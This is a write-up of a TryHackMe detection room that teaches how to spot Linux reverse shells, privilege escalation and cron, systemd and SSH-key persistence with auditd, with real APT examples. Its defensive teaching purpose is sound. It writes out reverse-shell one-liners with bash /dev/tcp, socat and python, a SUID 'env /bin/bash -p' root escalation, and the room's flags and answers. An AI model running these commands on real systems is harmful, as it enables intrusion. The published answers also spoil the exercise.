---

title: Linux Threat Detection 3

date: 2026-07-31 12:00 +0300

categories: [Foundations, Linux]

tags: [linux, privilege-escalation, persistence, reverse-shells, auditd]

description: "How attackers turn a limited web exploit into a full reverse shell, escalate from a service account to root, and set up five different ways to persist on Linux, each one lifted from a real APT or ransomware campaign."

---

## Description

"Linux Threat Detection 3" closes out the five-room series that started with Linux Logging for SOC. Where Linux Threat Detection 2 covered automated, opportunistic "hack and forget" botnets like Dota3, this room shifts to deliberate, manual intrusion techniques: reverse shells, privilege escalation, and five distinct ways a targeted attacker persists on a Linux host. The final task recaps the full MITRE ATT&CK matrix the series has covered, from Initial Access through Persistence.

Every answer and finding below matches what I confirmed on the platform.

## The problem

A web exploit rarely hands over a real terminal. Command injection through a form field or an API parameter usually means buggy output, execution timeouts, rate limits, and no way to run anything interactive, no `Ctrl+C`, no tab completion, no persistent working directory between commands. A reverse shell fixes this by flipping the connection: instead of the attacker repeatedly sending one-off commands into a web form, the victim's machine connects out to the attacker and hands over a proper interactive shell, `bash`, `socat`, or `python` are all capable of it with a single line.

Getting that shell is rarely the same as owning the box. Initial Access through a web application usually lands as whatever low-privilege account runs the service, often restricted to a single folder with no ability to install anything. Reaching root from there requires a genuine Privilege Escalation technique, and unlike a fixed list of a dozen Windows logon types, Linux privilege escalation has hundreds of possible SUID misconfigurations and thousands of software vulnerabilities, each exploitable in its own way. Detecting the exploit by name is a losing game. Detecting the moment the effective user changes is not.

Persistence is where this room's real attacker profile shows itself. The automated botnets from Linux Threat Detection 2 grab what they can and move on. A targeted intruder plans to come back, sometimes weeks later, and invests accordingly: a cron job, a systemd service, a second user account, a backdoored SSH key, sometimes more than one at once. Five methods are covered here, and every single one of them maps to a real, named campaign rather than a hypothetical.

## How it works

**Step 1: Detect a reverse shell with a process tree.** Task 2 uses TryPingMe, the same vulnerable app from Linux Threat Detection 1, to demonstrate three ways to open a reverse shell once command injection is confirmed.

| Command on the victim | What it does |
|---|---|
| `bash -i >& /dev/tcp/10.10.10.10/1337 0>&1` | Forces the victim to connect out and hand over a `bash` session |
| `socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane` | Same result via `socat`, with a full pseudo-terminal |
| `python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")'` | Same result via Python's socket and `pty` modules |

| Question | Answer |
|---|---|
| Output after the ping results from `127.0.0.1 && whoami` | `svctrypingme` |
| Flag from spawning a reverse shell to `attacker.thm` | `THM{revshells_practitioner!}` |
| IP that spawned a similar reverse shell in the exported logs | `10.14.105.255` |

That last IP is not a coincidence. It is the same attacker IP that exploited TryPingMe's command injection in Linux Threat Detection 1, which means this room's scenario is a direct continuation of that intrusion rather than a fresh, unrelated one. The detection method carries over identically too: `ausearch -i -x socat` finds the reverse shell process, its `ppid` leads to the `/bin/sh -c` wrapper that launched it, and one more hop up the tree lands on `/usr/bin/python3 /opt/trypingme/main.py`, the same application process root from before. Once the reverse shell process is found, listing everything spawned under its `ppid` reconstructs the attacker's entire session, command by command, regardless of what they typed.

**Step 2: Confirm privilege escalation by comparing the effective user.** Task 3 lays out three realistic Discovery-to-exploit chains before getting into detection.

| Discovery finding | Escalation technique |
|---|---|
| `uname -a` shows an unpatched Ubuntu 16.04 | A public kernel exploit like PwnKit |
| `find /bin -perm 4000` finds an `env` binary with the SUID bit set | `/bin/env /bin/bash -p` for an instant root shell |
| `ls /etc/ssh` exposes an unprotected `ssh-backup-key` | `ssh root@127.0.0.1 -i ssh-backup-key` |

| Question | Answer |
|---|---|
| Command line used to search files for the word "pass" | `grep -iR pass .` |
| Command line used to escalate to root | `su root` |
| Root password found inside the detected `.env` file | `nGql1pQkGa` |

PwnKit, the room's headline example, is not a minor bug. Tracked as CVE-2021-4034, it is a memory corruption flaw in `pkexec`, a SUID-root tool installed by default on essentially every major Linux distribution, that sat unnoticed in the code since 2009 before Qualys researchers disclosed it in January 2022. Exploitation takes any unprivileged user straight to full root with a couple of commands and no dependency on a specific kernel version, which is why it remains a go-to technique against unpatched systems years after the patch shipped. The room's real lesson, though, is that memorizing PwnKit's mechanics matters less than the universal signal any privilege escalation leaves behind: an `ausearch -x` on the exploit binary shows it running as the low-privilege service account, and the very next process in its `ppid` chain runs as `root`. That single before-and-after comparison catches PwnKit, a SUID `env` binary, and an exploit nobody has documented yet, all with the same query.

**Step 3: Catch startup persistence in cron and systemd before it fires.** Task 4 covers the two most common ways to survive a reboot, both of which auditd can catch as file changes or as the process that made them.

| Persistence method | Files to monitor | Processes to monitor |
|---|---|---|
| Cron jobs | `/etc/crontab`, `/etc/cron.d/*`, `/var/spool/cron/*` | `crontab -e`, direct edits via `vi` or `nano` |
| Systemd services | `/lib/systemd/system/*`, `/etc/systemd/system/*` | `systemctl start`, `systemctl enable` |

| Question | Answer |
|---|---|
| Flag from the malware persisting as a service | `THM{hidden_penguin!}` |
| Flag from the malware persisting as a cron job | `THM{ressurect_on_reboot!}` |

Both examples in the room's own text are drawn from real, documented intrusions. APT29's Linux backdoor GoldMax, part of the same StellarParticle campaign linked to the SolarWinds SUNBURST supply chain attack, persisted through a `@reboot` line in a non-root user's crontab while posing as a legitimate file in a hidden directory. CrowdStrike's incident responders only found it during a 2021 investigation, roughly two years after it was deployed. The Rocke cryptomining group takes the opposite approach to the same mechanism: after exploiting exposed Redis or phpMyAdmin instances, Red Canary documented Rocke writing a cron entry directly to `/etc/cron.d/root` that re-downloads its payload from Pastebin every ten minutes, a scheduling choice built specifically to survive an IT team deleting the malware once and not checking back.

Systemd persistence carries the higher stakes of the two. Mandiant traced the October 2022 Ukraine power grid attack to Sandworm deploying GOGETTER, a Go-based tunneling tool, through a systemd service unit configured with `WantedBy=multi-user.target` and disguised as a legitimate service. That persistence mechanism kept GOGETTER's proxy alive across reboots long enough for Sandworm to pivot into a SCADA hypervisor and trip circuit breakers, an outage timed to coincide with missile strikes on the same Ukrainian infrastructure. A service file that looks unremarkable in a directory listing was one link in a chain that ended in a physical blackout.

**Step 4: Distinguish account persistence from what auditd can and cannot see.** Task 5 covers two ways to stay logged in without leaving any malware on disk at all.

| Method | Detection approach |
|---|---|
| New user account | `grep -E 'useradd|usermod' /var/log/auth.log`, then reconstruct the creating process with auditd |
| Backdoored SSH key | Monitor `~/.ssh/authorized_keys` directly for file changes, not process creation |

| Question | Answer |
|---|---|
| User created and added to the `sudo` group | `koichi` |
| File changed to allow SSH key persistence | `/root/.ssh/authorized_keys` |

The room explicitly calls back to Dota3 from Linux Threat Detection 2 here, which added its own key to a breached user's `authorized_keys` with the distinctive `mdrfckr` comment, and the reason this technique is genuinely hard to catch deserves its own attention: `echo [key] >> ~/.ssh/authorized_keys` is a Bash builtin, not a separate executable, so it never generates its own `execve` event in auditd. The command shows up in process logs as nothing more than `bash`, indistinguishable from a thousand other legitimate shell operations. Watching for new SSH key files created by process monitoring alone misses this entirely. The only reliable catch is watching the `authorized_keys` file itself for changes, regardless of which process or built-in command touched it.

Application persistence takes the blind spot one step further. A compromised WordPress admin panel can drop a web shell that runs commands entirely inside the application layer, no cron job, no new user, no SSH key, which means auditd and every log source covered across this entire series can stay completely silent while the attacker keeps their access. The room is upfront that this sits outside its scope, but the warning matters: if every technique covered here comes up clean and malware keeps reappearing, the persistence is probably living somewhere none of these logs can reach.

**Step 5: Recognize when Linux becomes the target of a real campaign.** Task 6 closes with three grounded scenarios rather than a hands-on investigation.

The first is structural: even an organization that is 99 percent Windows usually has at least one Internet-facing Linux box, a firewall, a mail gateway, a web server, and a single compromised one is enough to open a path into the rest of the network. The second is Kimsuky, the North Korean espionage group also tracked as Springtail, whose Linux backdoor Gomir, documented by Symantec in May 2024, installs itself to `/var/log/syslogd` and creates a systemd service literally named `syslogd`, chosen specifically because it looks like the logging daemon it is hiding next to. The third is ransomware, and the data backs up the room's framing: Huntress reported that the hypervisor share of ransomware encryption events jumped roughly eightfold across 2025, from 3 to 25 percent of the total, even as Forescout recorded a 90 percent drop in Internet-exposed ESXi servers over the prior two years. Attackers stopped scanning the open internet for ESXi hosts and started reaching them the deliberate way, through Active Directory and flaws like CVE-2024-37085, which let LockBit's and Akira's Linux encryptors re-create a deleted admin group and take the whole hypervisor down in one pass.

| Question | Answer |
|---|---|
| Does Linux ransomware exist and impact organizations worldwide? | `Yea` |
| Should you learn Linux threats even if working with Windows? | `Yea` |

## Why it matters

The `authorized_keys` builtin gap is the single most important technical lesson in this room, because it is not a corner case. Any command a shell can execute without launching a separate program, `echo`, `cd`, variable assignments, redirections, quietly evades an entire category of monitoring most SOC teams lean on by default. Process-based detection catches an attacker who runs a script. It does not catch an attacker who knows to avoid one, and any competent targeted intrusion will know that.

Application-layer persistence pushes the same lesson further: some of the most durable footholds are ones no log source in this series was ever built to see. That is not a flaw in auditd or `auth.log`, it is a boundary, and a SOC that forgets where that boundary sits will chase phantom reinfections without ever checking whether a web shell survived every cleanup effort aimed at the system underneath it.

The point that ties this room together, and closes out the series, is that none of its five persistence methods are theoretical. GoldMax, Rocke, GOGETTER, and Gomir are four different threat actors with four different motives, financial, espionage, sabotage, opportunistic, using two mechanisms, cron and systemd, that any Linux admin already has on their system. The techniques a SOC analyst needs to recognize are the same handful of primitives, reused by everyone from cryptomining crews to state-sponsored sabotage units, because a working technique does not need to be replaced just for being well documented.

## Key takeaways

- Reverse shells convert a limited, one-shot web exploit into a full interactive session, and the process tree that reveals one, from `socat` or `python` back to the vulnerable app, is identical regardless of which tool the attacker chose.
- Privilege escalation is nearly impossible to catch by matching exploit signatures, but trivial to catch by comparing the effective user before and after a suspicious process runs.
- PwnKit (CVE-2021-4034) sat undiscovered in `pkexec` for over a decade and still works against any unpatched system, which is why exploit age is not a reason to deprioritize a detection rule.
- Cron and systemd persistence both leave a file to monitor and a management command to watch, and real campaigns from APT29 to Sandworm to Rocke all use the exact mechanisms this room teaches.
- Shell builtins like `echo` never generate their own process in auditd, which means file monitoring on `~/.ssh/authorized_keys`, not process monitoring, is the only reliable way to catch a backdoored SSH key.
- Application-layer persistence is invisible to every log source this series has covered, a genuine blind spot worth knowing about rather than assuming away.